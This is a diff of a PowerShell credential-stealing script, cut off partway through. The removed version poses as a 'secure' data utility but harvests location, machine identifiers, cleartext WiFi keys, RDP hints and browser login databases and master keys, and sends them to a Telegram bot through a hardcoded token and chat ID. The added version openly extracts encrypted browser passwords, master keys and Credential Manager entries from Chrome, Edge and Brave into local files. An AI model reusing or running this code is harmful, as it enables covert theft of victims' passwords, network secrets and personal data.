@@ -1,494 +1,154 @@
-# Secure System Data Extraction Utility
-# Comprehensive data collection with secure transmission
+# Multi-Browser and Network Credential Extraction Script
+# Extracts encrypted password data from Chrome, Edge, Brave, and Windows Credential Manager
 
 param(
-    [string]$CommToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
-    [string]$CommChannel = "2047893044"
+    [string]$CSVPath = ".\CredentialsSummary.csv",
+    [string]$JSONPath = ".\CredentialsData.json"
 )
 
-# Function to get public IP information
-function Get-NetworkLocationData {
-    try {
-        Write-Host "Acquiring network location data..." -ForegroundColor Yellow
-        $ipInfo = Invoke-RestMethod -Uri "http://ipinfo.io/json" -TimeoutSec 10
-        return @{
-            PublicIP = $ipInfo.ip
-            Country = $ipInfo.country
-            Region = $ipInfo.region
-            City = $ipInfo.city
-            Org = $ipInfo.org
-            Loc = $ipInfo.loc
-            Timezone = $ipInfo.timezone
-        }
-    } catch {
-        Write-Host "Network location data unavailable: $($_.Exception.Message)" -ForegroundColor Red
-        return @{
-            PublicIP = "Undetermined"
-            Country = "Undetermined"
-            Region = "Undetermined"
-            City = "Undetermined"
-            Org = "Undetermined"
-            Loc = "Undetermined"
-            Timezone = "Undetermined"
-        }
+Write-Host "Multi-Browser and Network Credential Extraction Tool" -ForegroundColor Green
+Write-Host "==================================================" -ForegroundColor Green
+
+# Browser paths configuration
+$browsers = @{
+    "Chrome" = @{
+        Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        Name = "Google Chrome"
     }
-}
-
-# Function to get detailed system information
-function Get-SystemSpecifications {
-    try {
-        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
-        $biosInfo = Get-WmiObject -Class Win32_BIOS
-        $processorInfo = Get-WmiObject -Class Win32_Processor
-        $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object Sum
-        
-        return @{
-            ComputerName = $env:COMPUTERNAME
-            UserName = $env:USERNAME
-            OSName = $osInfo.Caption
-            OSVersion = $osInfo.Version
-            OSBuild = $osInfo.BuildNumber
-            BIOSSerial = $biosInfo.SerialNumber
-            Processor = $processorInfo.Name
-            ProcessorCores = $processorInfo.NumberOfCores
-            TotalMemoryGB = [math]::Round($memoryInfo.Sum / 1GB, 2)
-            SystemManufacturer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
-            SystemModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
-            LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
-            MACAddress = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
-        }
-    } catch {
-        Write-Host "System specs collection error: $($_.Exception.Message)" -ForegroundColor Red
-        return @{
-            ComputerName = $env:COMPUTERNAME
-            UserName = $env:USERNAME
-            Error = $_.Exception.Message
-        }
+    "Edge" = @{
+        Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        Name = "Microsoft Edge"
     }
-}
-
-# Function to get user profile information
-function Get-UserProfileData {
-    Write-Host "Collecting user profile information..." -ForegroundColor Yellow
-    
-    try {
-        $userPath = [Environment]::GetFolderPath("UserProfile")
-        $userInfo = @{
-            FullName = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName
-            UserName = $env:USERNAME
-            ProfilePath = $userPath
-            SID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).SID
-            Domain = $env:USERDOMAIN
-        }
-
-        # Try to get email from registry
-        try {
-            $mailClients = @(
-                "HKCU:\Software\Microsoft\IdentityCRL",
-                "HKCU:\Software\Microsoft\Office",
-                "HKCU:\Software\Google\Chrome",
-                "HKCU:\Software\Mozilla\Firefox"
-            )
-            
-            foreach ($path in $mailClients) {
-                if (Test-Path $path) {
-                    $email = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | 
-                            Select-Object -ExpandProperty "Email" -ErrorAction SilentlyContinue
-                    if ($email) {
-                        $userInfo.Email = $email
-                        break
-                    }
-                }
-            }
-        } catch {
-            $userInfo.Email = "Not detected"
-        }
-
-        $userInfo.ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        return $userInfo
-
-    } catch {
-        Write-Host "User profile collection error: $($_.Exception.Message)" -ForegroundColor Red
-        return @{
-            UserName = $env:USERNAME
-            Error = $_.Exception.Message
-            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        }
-    }
-}
-
-# Function to extract detailed WiFi information
-function Get-WirelessNetworkData {
-    Write-Host "Acquiring wireless network configurations..." -ForegroundColor Yellow
-    
-    $wifiProfiles = @()
-    
-    try {
-        # Get all WiFi profiles
-        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-            $_.ToString().Split(":")[1].Trim()
-        }
-        
-        foreach ($profile in $profiles) {
-            try {
-                # Get detailed WiFi profile information
-                $profileInfo = netsh wlan show profile name="$profile" key=clear
-                $profileDetails = @{}
-                
-                foreach ($line in $profileInfo) {
-                    if ($line -match "^\s*([^:]+)\s*:\s*(.+)") {
-                        $key = $matches[1].Trim()
-                        $value = $matches[2].Trim()
-                        $profileDetails[$key] = $value
-                    }
-                }
-                
-                # Replace null coalescing with compatible syntax
-                $keyContent = if ($profileDetails["Key Content"]) { $profileDetails["Key Content"] } else { "No security key" }
-                $authentication = if ($profileDetails["Authentication"]) { $profileDetails["Authentication"] } else { "Unknown" }
-                $encryption = if ($profileDetails["Cipher"]) { $profileDetails["Cipher"] } else { "Unknown" }
-                $connectionMode = if ($profileDetails["Connection mode"]) { $profileDetails["Connection mode"] } else { "Unknown" }
-                $networkType = if ($profileDetails["Network type"]) { $profileDetails["Network type"] } else { "Unknown" }
-                $radioType = if ($profileDetails["Radio type"]) { $profileDetails["Radio type"] } else { "Unknown" }
-                $ssidName = if ($profileDetails["SSID name"]) { $profileDetails["SSID name"] } else { $profile }
-                
-                $wifiProfiles += @{
-                    SSID = $profile
-                    Password = $keyContent
-                    Authentication = $authentication
-                    Encryption = $encryption
-                    ConnectionMode = $connectionMode
-                    NetworkType = $networkType
-                    RadioType = $radioType
-                    SSIDName = $ssidName
-                    ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                }
-            } catch {
-                Write-Host "Wireless profile $profile processing error" -ForegroundColor Red
-            }
-        }
-        
-        return @{
-            Profiles = $wifiProfiles
-            TotalNetworks = $wifiProfiles.Count
-            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        }
-        
-    } catch {
-        Write-Host "Wireless data acquisition failed: $($_.Exception.Message)" -ForegroundColor Red
-        return @{
-            Profiles = @()
-            TotalNetworks = 0
-            Error = $_.Exception.Message
-            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        }
-    }
-}
-
-# Function to extract RDP/VPN credentials
-function Get-RemoteConnectionData {
-    Write-Host "Gathering remote connection configurations..." -ForegroundColor Yellow
-    
-    $remoteData = @{
-        RDPConnections = @()
-        VPNConnections = @()
-        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    }
-    
-    try {
-        # Check RDP connections
-        try {
-            $rdpPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
-            if (Test-Path $rdpPath) {
-                $rdpServers = Get-ChildItem -Path $rdpPath -ErrorAction SilentlyContinue
-                foreach ($server in $rdpServers) {
-                    $serverName = $server.PSChildName
-                    $username = Get-ItemProperty -Path $server.PSPath -Name "UsernameHint" -ErrorAction SilentlyContinue
-                    $usernameHint = if ($username.UsernameHint) { $username.UsernameHint } else { "Not stored" }
-                    
-                    $remoteData.RDPConnections += @{
-                        Server = $serverName
-                        UsernameHint = $usernameHint
-                    }
-                }
-            }
-        } catch {
-            Write-Host "RDP data collection issue" -ForegroundColor Yellow
-        }
-        
-        # Check VPN connections
-        try {
-            $vpnPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
-            if (Test-Path $vpnPath) {
-                $vpnConnections = Get-ChildItem -Path $vpnPath -ErrorAction SilentlyContinue
-                foreach ($connection in $vpnConnections) {
-                    if ($connection.PSChildName -match "VPN") {
-                        $remoteData.VPNConnections += @{
-                            Name = $connection.PSChildName
-                            ConfigPath = $connection.PSPath
-                        }
-                    }
-                }
-            }
-        } catch {
-            Write-Host "VPN data collection issue" -ForegroundColor Yellow
-        }
-        
-        return $remoteData
-        
-    } catch {
-        Write-Host "Remote connection data error: $($_.Exception.Message)" -ForegroundColor Red
-        return $remoteData
-    }
-}
-
-# Secure message function
-function Send-SecureNotification {
-    param([string]$MessageText)
-    
-    try {
-        $endpoint = "https://api.telegram.org/bot$CommToken/sendMessage"
-        $payload = @{
-            chat_id = $CommChannel
-            text = $MessageText
-            parse_mode = "HTML"
-        }
-        
-        $jsonPayload = $payload | ConvertTo-Json
-        $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $jsonPayload -ContentType "application/json"
-        
-        if ($response.ok) {
-            Write-Host "Notification sent" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "Notification issue: $($response.description)" -ForegroundColor Red
-            return $false
-        }
-    } catch {
-        Write-Host "Notification error: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-# Secure communication function
-function Invoke-SecureDelivery {
-    param(
-        [string]$ContentPath,
-        [string]$Description
-    )
-    
-    try {
-        if (-not (Test-Path $ContentPath)) {
-            Write-Host "Content file not found: $ContentPath" -ForegroundColor Red
-            return $false
-        }
-        
-        # Wait for file to be fully written
-        $maxWait = 10
-        $waitTime = 0
-        while ($waitTime -lt $maxWait) {
-            try {
-                $file = Get-Item $ContentPath
-                if ($file.Length -gt 0) {
-                    break
-                }
-            } catch {}
-            Start-Sleep -Seconds 1
-            $waitTime++
-        }
-
-        $endpoint = "https://api.telegram.org/bot$CommToken/sendDocument"
-        
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $fileBytes = [System.IO.File]::ReadAllBytes($ContentPath)
-        $fileName = Split-Path $ContentPath -Leaf
-        
-        $LF = "`r`n"
-        $bodyLines = (
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            $CommChannel,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"caption`"",
-            "",
-            $Description,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream",
-            "",
-            [System.Text.Encoding]::UTF8.GetString($fileBytes),
-            "--$boundary--"
-        ) -join $LF
-
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
-        
-        $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
-        
-        if ($response.ok) {
-            Write-Host "Content delivered successfully: $fileName" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "Delivery issue: $($response.description)" -ForegroundColor Red
-            return $false
-        }
-    } catch {
-        Write-Host "Secure delivery error: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+    "Brave" = @{
+        Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+        Name = "Brave Browser"
     }
 }
 
 # Function to install SQLite3 if needed
-function Install-DatabaseTool {
+function Install-SQLiteIfNeeded {
     try {
-        Write-Host "Setting up database utility..." -ForegroundColor Yellow
-        $toolUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
-        $archivePath = "sqlite-temp.zip"
+        Write-Host "Downloading SQLite3..." -ForegroundColor Yellow
+        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+        $tempZip = "sqlite-temp.zip"
         
-        Invoke-WebRequest -Uri $toolUrl -OutFile $archivePath -UseBasicParsing
-        Expand-Archive -Path $archivePath -DestinationPath ".\sqlite-temp" -Force
-        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" -Force
+        Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+        Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+        Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
         
-        Remove-Item $archivePath -Force -ErrorAction SilentlyContinue
+        Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
         Remove-Item ".\sqlite-temp" -Recurse -Force -ErrorAction SilentlyContinue
         
-        Write-Host "Database utility ready" -ForegroundColor Green
+        Write-Host "SQLite3 downloaded successfully." -ForegroundColor Green
         return $true
     } catch {
-        Write-Host "Database setup failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Failed to download SQLite3: $_" -ForegroundColor Red
         return $false
     }
 }
 
-# Function to extract browser master key (DPAPI)
+# Function to extract master key from browser's Local State file
 function Get-BrowserMasterKey {
     param(
         [string]$BrowserDataPath,
         [string]$BrowserName
     )
     
-    $masterKeyInfo = @{
-        Browser = $BrowserName
-        LocalStatePath = ""
-        MasterKey = ""
-        KeyDerivation = ""
-        EncryptionType = ""
-        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $localStatePath = Join-Path $BrowserDataPath "Local State"
+    
+    if (-not (Test-Path $localStatePath)) {
+        Write-Host "$BrowserName Local State file not found." -ForegroundColor Yellow
+        return $null
     }
     
     try {
-        # Chrome/Edge/Brave local state file
-        $localStatePath = Join-Path $BrowserDataPath "Local State"
-        if (Test-Path $localStatePath) {
-            $masterKeyInfo.LocalStatePath = $localStatePath
-            $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
-            
-            if ($localStateContent.os_crypt -and $localStateContent.os_crypt.encrypted_key) {
-                $encryptedKey = $localStateContent.os_crypt.encrypted_key
-                $masterKeyInfo.MasterKey = $encryptedKey
-                $masterKeyInfo.EncryptionType = "DPAPI"
-                
-                # Check key derivation method
-                if ($localStateContent.os_crypt.key_derivation) {
-                    $masterKeyInfo.KeyDerivation = $localStateContent.os_crypt.key_derivation
-                } else {
-                    $masterKeyInfo.KeyDerivation = "PBKDF2"
-                }
-            }
+        Write-Host "Reading $BrowserName Local State file..." -ForegroundColor Yellow
+        $localStateContent = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = $localStateContent.os_crypt.encrypted_key
+        
+        if (-not $encryptedKey) {
+            Write-Host "No encrypted key found in $BrowserName Local State" -ForegroundColor Yellow
+            return $null
         }
         
-        # Firefox key4.db location
-        if ($BrowserName -eq "Firefox") {
-            $key4dbPath = Join-Path $BrowserDataPath "key4.db"
-            if (Test-Path $key4dbPath) {
-                $masterKeyInfo.MasterKey = "Firefox Key4 Database"
-                $masterKeyInfo.EncryptionType = "ASN1"
-                $masterKeyInfo.KeyDerivation = "PKCS5_PBKDF2"
-            }
-        }
+        Write-Host "Found encrypted master key for $BrowserName" -ForegroundColor Green
         
+        return @{
+            EncryptedKey = $encryptedKey
+            KeyLength = ([System.Convert]::FromBase64String($encryptedKey)).Length
+            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            Browser = $BrowserName
+        }
     } catch {
-        Write-Host "Master key extraction error for $BrowserName: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "Error extracting $BrowserName master key: $_" -ForegroundColor Red
+        return $null
     }
-    
-    return $masterKeyInfo
 }
 
-# Enhanced function to extract browser encrypted passwords
-function Get-BrowserStorageData {
+# Function to find all login data files in browser profiles
+function Get-BrowserLoginDataFiles {
     param(
         [string]$BrowserDataPath,
         [string]$BrowserName
     )
     
     $loginDataFiles = @()
-    $results = @()
-    $encryptedData = @()
-    $browserMasterKey = Get-BrowserMasterKey -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
     
     if (-not (Test-Path $BrowserDataPath)) {
-        Write-Host "$BrowserName data directory not found" -ForegroundColor Yellow
-        return @{ 
-            Summary = @()
-            DetailedData = @()
-            MasterKeyInfo = $browserMasterKey
-            Status = "Directory not found"
+        Write-Host "$BrowserName data directory not found: $BrowserDataPath" -ForegroundColor Yellow
+        return $loginDataFiles
+    }
+    
+    # Check default profile
+    $defaultLoginData = Join-Path $BrowserDataPath "Default\Login Data"
+    if (Test-Path $defaultLoginData) {
+        $loginDataFiles += @{
+            Path = $defaultLoginData
+            Profile = "Default"
         }
     }
     
-    # Define browser-specific database paths
-    $browserDatabasePaths = @{
-        "Chrome" = @("Default\Login Data", "*\Login Data")
-        "Edge" = @("Default\Login Data", "*\Login Data") 
-        "Brave" = @("Default\Login Data", "*\Login Data")
-        "Firefox" = @("logins.json", "key4.db")
-        "Opera" = @("Login Data")
-        "Vivaldi" = @("Default\Login Data", "*\Login Data")
-        "Yandex" = @("User Data\Default\Login Data", "User Data\*\Login Data")
-    }
+    # Check other profiles
+    $profilePatterns = @("Profile *", "Profile*", "User *", "User*")
     
-    # Get database paths for this browser
-    $databasePatterns = if ($browserDatabasePaths.ContainsKey($BrowserName)) {
-        $browserDatabasePaths[$BrowserName]
-    } else {
-        @("Default\Login Data", "*\Login Data")
-    }
-    
-    foreach ($pattern in $databasePatterns) {
-        if ($pattern -like "*\*") {
-            # Pattern with wildcard
-            $parentDir = Split-Path $pattern -Parent
-            $filePattern = Split-Path $pattern -Leaf
-            
-            $parentPath = Join-Path $BrowserDataPath $parentDir
-            if (Test-Path $parentPath) {
-                $matchingFiles = Get-ChildItem -Path $parentPath -Filter $filePattern -Recurse -ErrorAction SilentlyContinue
-                foreach $file in $matchingFiles {
-                    $profileName = $file.Directory.Name
-                    $loginDataFiles += @{ Path = $file.FullName; Profile = $profileName }
+    foreach ($pattern in $profilePatterns) {
+        $profileDirs = Get-ChildItem -Path $BrowserDataPath -Directory -Filter $pattern -ErrorAction SilentlyContinue
+        foreach ($profileDir in $profileDirs) {
+            $loginDataPath = Join-Path $profileDir.FullName "Login Data"
+            if (Test-Path $loginDataPath) {
+                $loginDataFiles += @{
+                    Path = $loginDataPath
+                    Profile = $profileDir.Name
                 }
             }
-        } else {
-            # Specific file path
-            $fullPath = Join-Path $BrowserDataPath $pattern
-            if (Test-Path $fullPath) {
-                $profileName = if ($pattern -match "Default") { "Default" } else { "Root" }
-                $loginDataFiles += @{ Path = $fullPath; Profile = $profileName }
-            }
         }
     }
+    
+    return $loginDataFiles
+}
+
+# Function to extract encrypted passwords from browser
+function Get-BrowserEncryptedPasswords {
+    param(
+        [string]$BrowserDataPath,
+        [string]$BrowserName,
+        [string]$BrowserKey
+    )
+    
+    $loginDataFiles = Get-BrowserLoginDataFiles -BrowserDataPath $BrowserDataPath -BrowserName $BrowserName
     
     if ($loginDataFiles.Count -eq 0) {
-        Write-Host "No login databases found for $BrowserName" -ForegroundColor Yellow
-        return @{ 
+        Write-Host "No login database files found for $BrowserName." -ForegroundColor Yellow
+        return @{
             Summary = @()
             DetailedData = @()
-            MasterKeyInfo = $browserMasterKey
-            Status = "No databases found"
         }
     }
     
-    Write-Host "Found $($loginDataFiles.Count) databases for $BrowserName" -ForegroundColor Green
+    Write-Host "Found $($loginDataFiles.Count) login database(s) for $BrowserName" -ForegroundColor Green
+    
+    $results = @()
+    $encryptedData = @()
     
     foreach ($loginDataFile in $loginDataFiles) {
         $dbPath = $loginDataFile.Path
@@ -497,344 +157,321 @@ function Get-BrowserStorageData {
         Write-Host "  Processing profile: $profileName" -ForegroundColor Cyan
         
         try {
-            $tempDbPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
+            # Copy the database to avoid locking issues
+            $tempDbPath = "temp_$($BrowserKey)_$($profileName -replace '[^a-zA-Z0-9]', '_').db"
             Copy-Item $dbPath $tempDbPath -Force
             
-            # Different queries for different browsers
-            if ($BrowserName -eq "Firefox") {
-                # Firefox uses logins.json instead of SQLite
-                $loginsJsonPath = Join-Path (Split-Path $dbPath -Parent) "logins.json"
-                if (Test-Path $loginsJsonPath) {
-                    $firefoxLogins = Get-Content $loginsJsonPath -Raw | ConvertFrom-Json
-                    foreach ($login in $firefoxLogins.logins) {
-                        $entryId = [System.Guid]::NewGuid().ToString()
-                        
-                        $encryptedEntry = @{
-                            Id = $entryId
-                            Browser = $BrowserName
-                            Profile = $profileName
-                            URL = $login.hostname
-                            Username = $login.username
-                            HexData = $login.password
-                            DataLength = if ($login.password) { $login.password.Length } else { 0 }
-                            EncryptionVersion = "Firefox"
-                            FormSubmitURL = $login.formSubmitURL
-                            UsernameField = $login.usernameField
-                            PasswordField = $login.passwordField
-                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                        }
-                        
-                        $encryptedData += $encryptedEntry
-                        $results += [PSCustomObject]@{
-                            ID = $entryId
-                            Browser = $BrowserName
-                            Profile = $profileName
-                            URL = $login.hostname
-                            Username = $login.username
-                            EncryptionVersion = "Firefox"
-                            DataLength = $encryptedEntry.DataLength
-                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                        }
-                    }
-                }
+            # Export data using SQLite
+            $tempCsvPath = "temp_$($BrowserKey)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
+            
+            if (Test-Path ".\sqlite3.exe") {
+                $sqlitePath = ".\sqlite3.exe"
             } else {
-                # Chrome-based browsers
-                $tempOutputPath = "temp_$($BrowserName)_$($profileName -replace '[^a-zA-Z0-9]', '_').csv"
-                
-                $query = @"
+                $sqlitePath = "sqlite3"
+            }
+            
+            # Query the database
+            $query = @"
 SELECT 
     origin_url, 
     username_value, 
     hex(password_value) as password_hex,
+    quote(password_value) as password_quoted,
+    length(password_value) as password_length,
     date_created,
     date_last_used,
-    times_used,
-    blacklisted_by_user,
-    scheme,
-    signon_realm
+    times_used
 FROM logins;
 "@
-                & .\sqlite3.exe -csv -header $tempDbPath $query > $tempOutputPath
+            & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
+            
+            if (Test-Path $tempCsvPath) {
+                $logins = Import-Csv $tempCsvPath
+                Write-Host "    Found $($logins.Count) login entries" -ForegroundColor Green
                 
-                if (Test-Path $tempOutputPath) {
-                    $logins = Import-Csv $tempOutputPath
-                    Write-Host "    Found $($logins.Count) entries" -ForegroundColor Green
+                $counter = 0
+                foreach ($login in $logins) {
+                    $counter++
                     
-                    foreach ($login in $logins) {
-                        $entryId = [System.Guid]::NewGuid().ToString()
-                        
-                        $encryptedEntry = @{
-                            Id = $entryId
-                            Browser = $BrowserName
-                            Profile = $profileName
-                            URL = $login.origin_url
-                            Username = $login.username_value
-                            HexData = $login.password_hex
-                            DataLength = if ($login.password_hex) { $login.password_hex.Length / 2 } else { 0 }
-                            EncryptionVersion = "Unknown"
-                            DateCreated = $login.date_created
-                            DateLastUsed = $login.date_last_used
-                            TimesUsed = $login.times_used
-                            Blacklisted = $login.blacklisted_by_user
-                            Scheme = $login.scheme
-                            SignonRealm = $login.signon_realm
-                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                        }
-                        
-                        # Detect encryption version
-                        if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$" -and $login.password_hex.Length -ge 6) {
-                            try {
-                                $prefixBytes = [System.Convert]::ToByte($login.password_hex.Substring(0, 2), 16), 
-                                              [System.Convert]::ToByte($login.password_hex.Substring(2, 2), 16),
-                                              [System.Convert]::ToByte($login.password_hex.Substring(4, 2), 16)
+                    # Create a unique identifier
+                    $entryId = [System.Guid]::NewGuid().ToString()
+                    
+                    # Store encrypted data
+                    $encryptedEntry = @{
+                        Id = $entryId
+                        Type = "Browser"
+                        Browser = $BrowserName
+                        BrowserKey = $BrowserKey
+                        Profile = $profileName
+                        URL = $login.origin_url
+                        Username = $login.username_value
+                        HexData = $login.password_hex
+                        DataLength = $login.password_length
+                        EncryptionVersion = "Unknown"
+                        DateCreated = $login.date_created
+                        DateLastUsed = $login.date_last_used
+                        TimesUsed = $login.times_used
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                    
+                    # Detect encryption version
+                    if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
+                        try {
+                            $hexString = $login.password_hex
+                            if ($hexString.Length -ge 6) {
+                                $prefixBytes = [System.Convert]::ToByte($hexString.Substring(0, 2), 16), 
+                                              [System.Convert]::ToByte($hexString.Substring(2, 2), 16),
+                                              [System.Convert]::ToByte($hexString.Substring(4, 2), 16)
                                 $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
                                 
                                 if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
                                     $encryptedEntry.EncryptionVersion = $prefix
-                                } else {
-                                    $encryptedEntry.EncryptionVersion = "DPAPI"
                                 }
-                            } catch {
-                                $encryptedEntry.EncryptionVersion = "DPAPI"
                             }
-                        }
-                        
-                        $encryptedData += $encryptedEntry
-                        $results += [PSCustomObject]@{
-                            ID = $entryId
-                            Browser = $BrowserName
-                            Profile = $profileName
-                            URL = $login.origin_url
-                            Username = $login.username_value
-                            EncryptionVersion = $encryptedEntry.EncryptionVersion
-                            DataLength = $encryptedEntry.DataLength
-                            DateCreated = $login.date_created
-                            DateLastUsed = $login.date_last_used
-                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        } catch {
+                            # Ignore detection errors
                         }
                     }
                     
-                    Remove-Item $tempOutputPath -Force -ErrorAction SilentlyContinue
+                    $encryptedData += $encryptedEntry
+                    
+                    # Add to results for CSV
+                    $results += [PSCustomObject]@{
+                        ID = $entryId
+                        Type = "Browser"
+                        Browser = $BrowserName
+                        Profile = $profileName
+                        URL = $login.origin_url
+                        Username = $login.username_value
+                        EncryptionVersion = $encryptedEntry.EncryptionVersion
+                        DataLength = $login.password_length
+                        HexDataPreview = if ($login.password_hex.Length -gt 50) { 
+                            $login.password_hex.Substring(0, 50) + "..." 
+                        } else { 
+                            $login.password_hex 
+                        }
+                        DateCreated = $login.date_created
+                        DateLastUsed = $login.date_last_used
+                        TimesUsed = $login.times_used
+                        ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    }
+                    
+                    if ($counter % 10 -eq 0 -and $counter -gt 0) {
+                        Write-Host "    Processed $counter entries..." -ForegroundColor Cyan
+                    }
                 }
+                
+                Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
             }
             
             Remove-Item $tempDbPath -Force -ErrorAction SilentlyContinue
             
         } catch {
-            Write-Host "    Profile $profileName processing error: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "    Error processing $BrowserName profile $profileName: $_" -ForegroundColor Red
         }
     }
     
     return @{
         Summary = $results
         DetailedData = $encryptedData
-        MasterKeyInfo = $browserMasterKey
-        Status = "Success"
-        TotalEntries = $results.Count
     }
 }
 
-# Function to get all browser paths
-function Get-AllBrowserPaths {
-    $browserPaths = @{}
-    
-    # Chrome-based browsers
-    $chromeBrowsers = @{
-        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
-        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
-        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
-        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
-        "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
-    }
-    
-    # Firefox
-    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (Test-Path $firefoxProfiles) {
-        $firefoxDirs = Get-ChildItem -Path $firefoxProfiles -Directory -ErrorAction SilentlyContinue
-        foreach ($dir in $firefoxDirs) {
-            if (Test-Path (Join-Path $dir.FullName "logins.json")) {
-                $browserPaths["Firefox_$($dir.Name)"] = $dir.FullName
+# Function to extract network credentials from Windows Credential Manager
+function Get-NetworkCredentials {
+    try {
+        Write-Host "Extracting network credentials from Windows Credential Manager..." -ForegroundColor Yellow
+        $results = @()
+        $encryptedData = @()
+        
+        # Use cmdkey to list credentials (requires elevated privileges)
+        $cmdkeyOutput = cmdkey /list
+        $credentialPattern = "Target: (.+?)\n.*?Type: (.+?)\n.*?User: (.+?)\n"
+        
+        $matches = [regex]::Matches($cmdkeyOutput, $credentialPattern)
+        
+        foreach ($match in $matches) {
+            $target = $match.Groups[1].Value.Trim()
+            $type = $match.Groups[2].Value.Trim()
+            $username = $match.Groups[3].Value.Trim()
+            
+            # Skip if no username (some credentials may not have associated users)
+            if (-not $username) { continue }
+            
+            $entryId = [System.Guid]::NewGuid().ToString()
+            
+            # Note: Actual password extraction requires native API calls or third-party tools
+            # Here we store metadata only, as passwords are encrypted in DPAPI
+            $encryptedEntry = @{
+                Id = $entryId
+                Type = "Network"
+                Target = $target
+                CredentialType = $type
+                Username = $username
+                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            }
+            
+            $encryptedData += $encryptedEntry
+            
+            $results += [PSCustomObject]@{
+                ID = $entryId
+                Type = "Network"
+                Browser = "N/A"
+                Profile = "N/A"
+                URL = $target
+                Username = $username
+                EncryptionVersion = "DPAPI"
+                DataLength = "N/A"
+                HexDataPreview = "N/A"
+                DateCreated = "N/A"
+                DateLastUsed = "N/A"
+                TimesUsed = "N/A"
+                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
             }
         }
-    }
-    
-    # Add Chrome-based browsers
-    foreach ($browser in $chromeBrowsers.Keys) {
-        if (Test-Path $chromeBrowsers[$browser]) {
-            $browserPaths[$browser] = $chromeBrowsers[$browser]
+        
+        Write-Host "Found $($results.Count) network credentials" -ForegroundColor Green
+        return @{
+            Summary = $results
